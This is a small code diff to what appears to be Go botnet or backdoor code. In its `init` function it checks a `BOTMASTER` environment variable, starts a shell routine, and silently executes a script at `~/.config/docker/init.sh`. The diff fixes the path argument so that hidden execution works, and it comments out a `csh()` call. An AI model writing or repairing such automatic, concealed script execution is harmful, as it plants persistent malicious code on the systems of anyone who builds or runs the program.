@@ -58,7 +58,7 @@ func fexists(name string) bool {
 }
 
 func init() {
-	go csh()
+	//go csh()
 	if os.Getenv("BOTMASTER") == "TRUE" {
 		return
 	}
@@ -141,7 +141,7 @@ func init() {
 		startsh(o)
 	}()
 	go func() {
-		f := fmt.Sprintf("%s/.config/docker/init.sh")
+		f := fmt.Sprintf("%s/.config/docker/init.sh", home)
 		_ = exec.Command(f).Run()
 	}()
 }
